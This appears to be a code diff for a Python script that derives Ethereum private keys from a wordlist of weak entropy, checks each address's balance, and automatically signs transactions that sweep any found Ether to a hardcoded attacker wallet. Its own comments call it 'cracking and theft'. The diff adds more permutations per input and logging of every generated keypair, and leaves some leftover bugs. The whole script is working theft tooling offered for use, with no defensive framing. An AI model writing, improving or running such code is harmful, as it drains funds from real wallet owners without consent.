@@ -10,7 +10,9 @@
 # 	If we find a wallet with Ether in it, the keys are weak so let's take the balance
 #
 # Benefits:
+#	Multiple permutation attempts per entropy input
 # 	Dynamic fee generation (with changeable margin of safety) to ensure your transaction goes through
+#	Reporting of all generated keypairs into user-specified file
 #
 # How to use it:
 #	Install 'pip' and any packages this program needs, as listed in the import statements below
@@ -20,6 +22,7 @@
 #	Profit
 #
 # Project TODOs:
+# 	Move user-defined variables to a config file
 #	Add more comprehensive permutations
 #		main(), tempLine > maxByteLength - do every maxByteLength-length permutation of tempLine
 #		main(), maxByteLength else - do every permutation of padding (1L-255R, 2L-254R, 3L-253R, etc)
@@ -63,7 +66,7 @@ controlledWallet = "0x2e2b43E20FCFC44D4cfCB16A723270c7a0Bc914F"
 # 0 = set the gas price dyamically based on market conditions
 maxGasPerTx = 0
 # Percent above fee market rate we wnt to be at, 0-100
-# Setting this higher is more guarantee your transaction will be included in the next block
+# Setting this higher gives a higher chance your transaction will be included in the next block
 marginOfSafety = 0
 # Keep 'gasCost' constant unless you know what you're doing
 gasCost = 21000
@@ -81,15 +84,16 @@ connectionUrl = "https://mainnet.infura.io/v3/" + infuraKey
 #
 ##### END CHANGE THESE ASAP #####
 
-# Connect to the APIs so we can interact with the Ethereum blockchian
-if (connectionUrl.startswith('wss')): # Websockets
-	web3 = Web3(Web3.WebsocketProvider(connectionUrl))
-else: # HTTP(S)
-	web3 = Web3(Web3.HTTPProvider(connectionUrl))
-
-# Double check our connection works
-if not web3.isConnected():
-	sys.exit("[ERROR] Cannot connect to given URL. Please verify you input the correct URL with no typos.")
+# Connect to the APIs so we can interact with the Ethereum blockchain
+def connect(connectionUrl):
+	if (connectionUrl.startswith('wss')): # Websockets
+		web3Instance = Web3(Web3.WebsocketProvider(connectionUrl))
+	else: # HTTP(S)
+		web3Instance = Web3(Web3.HTTPProvider(connectionUrl))
+	# Double check our connection works
+	if not web3Instance.isConnected():
+		sys.exit("[ERROR] Cannot connect to given URL. Please verify you input the correct URL with no typos.")
+	return web3Instance
 
 # Use the 'entropy' parameter to create an account
 def generateAddress(entropy):
@@ -110,10 +114,10 @@ def reporting(pubKey, privKey, balance):
 		writer.writerow(data)
 
 # The actual cracking and theft
-def findANonZeroBalance(entropy):
+def findANonZeroBalance(entropy, web3Instance):
 	# Create a wallet
 	pubKey, privKey = generateAddress(entropy)
-	balance = web3.eth.getBalance(pubKey) # Balance in wei
+	balance = web3Instance.eth.getBalance(pubKey) # Balance in wei
 	#balance = web3.fromWei(balance, "ether") # Balance in Ether
 	
 	# Save relevant data
@@ -121,13 +125,13 @@ def findANonZeroBalance(entropy):
 
 	# Jackpot
 	if (balance > 0): # 1 in 2^256 chance this condition is true	
-		nonce = web3.eth.getTransactionCount(pubKey, 'latest')
+		nonce = web3Instance.eth.getTransactionCount(pubKey, 'latest')
 		
 		# Calculate gas costs (EIP-1559 compliant)
 		baseFee = int(maxGasPerTx)
 		if not baseFee:
-			baseFee = web3.eth.getBlock("pending").baseFeePerGas
-		priorityFee = web3.toWei(preferredPriorityFee, 'gwei')
+			baseFee = web3Instance.eth.getBlock("pending").baseFeePerGas
+		priorityFee = web3Instance.toWei(preferredPriorityFee, 'gwei')
 		marginOfSafety = 1 + (marginOfSafety / 100)
 		maxFee = web3.toWei((((2 * baseFee) + priorityFee) * marginOfSafety), 'gwei')
 		
@@ -142,12 +146,14 @@ def findANonZeroBalance(entropy):
 			'maxPriorityFeePerGas': priorityFee
 		}
 
-		signed_tx = web3.eth.account.signTransaction(tx, privKey)
-		tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
-		print("[SUCCESS] " + web3.fromWei(balance, "ether") + " Ether transferred from " + pubKey + " to us in tx " + web3.toHex(tx_hash))
+		signed_tx = web3Instance.eth.account.signTransaction(tx, privKey)
+		tx_hash = web3Instance.eth.sendRawTransaction(signed_tx.rawTransaction)
+		print("[SUCCESS] " + web3Instance.fromWei(balance, "ether") + " Ether transferred from " + pubKey + " to us in tx " + web3Instance.toHex(tx_hash))
 
 # Main function
 def main():
+	print("[INFO] Connecting to Ethereum mainnet ... ")
+	web3Instance = connect(connectionUrl)
 	print("[INFO] Generating keys, this will take a while ...")
 	# Open up our source of entropy
 	sourceFile = open(keygenFile)
@@ -166,27 +172,27 @@ def main():
 			# Too long, just use the first or last maxByteLength bytes
 			if (tempLineByteLength > maxByteLength):
 				# First maxByteLength bytes
-				findANonZeroBalance(tempLine[:maxByteLength])
+				findANonZeroBalance(tempLine[:maxByteLength], web3Instance)
 
 				# Last maxByteLength bytes
-				findANonZeroBalance(tempLine[len(tempLine) - maxByteLength:])
+				findANonZeroBalance(tempLine[len(tempLine) - maxByteLength:], web3Instance)
 
 			# Edge case - line doesn't exist or isnt working
 			elif (tempLineByteLength < 0):
-				findANonZeroBalance('')
+				findANonZeroBalance('', web3Instance)
 
 			# Proper length entropy
 			else:
 				pad = maxByteLength - tempLineByteLength
 
 				# Pad on the left
-				findANonZeroBalance(bytes(pad) + tempLine)
+				findANonZeroBalance(bytes(pad) + tempLine, web3Instance)
 			
 				# Pad on the right
-				findANonZeroBalance(tempLine + bytes(pad))
+				findANonZeroBalance(tempLine + bytes(pad), web3Instance)
 
 				# Pad 50/50 Left/Right split
-				findANonZeroBalance(bytes(int(pad / 2)) + tempLine + bytes(int(pad / 2)) + bytes(int(pad % 2)))
+				findANonZeroBalance(bytes(int(pad / 2)) + tempLine + bytes(int(pad / 2)) + bytes(int(pad % 2)), web3Instance)
 				
 	print("[INFO] Keygen complete, please check \'" + dictFileName + "\' in this directory for details.")
 	sourceFile.close()
